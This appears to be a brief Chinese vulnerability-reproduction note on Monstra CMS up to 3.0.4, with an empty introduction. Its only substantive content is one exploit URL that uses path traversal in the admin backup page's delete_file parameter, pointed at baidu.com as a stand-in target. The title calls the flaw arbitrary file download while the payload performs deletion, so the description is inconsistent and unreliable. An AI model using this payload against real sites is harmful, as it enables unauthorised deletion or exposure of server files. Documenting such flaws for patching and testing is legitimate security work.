# Monstra CMS 任意文件下载漏洞

## 一、漏洞简介

## 二、漏洞影响

Monstra CMS <= 3.0.4

### 三、复现过程

```
http://www.baidu.com/admin/index.php?id=backup&delete_file=/.......//./.......//./index.php&token=f6
```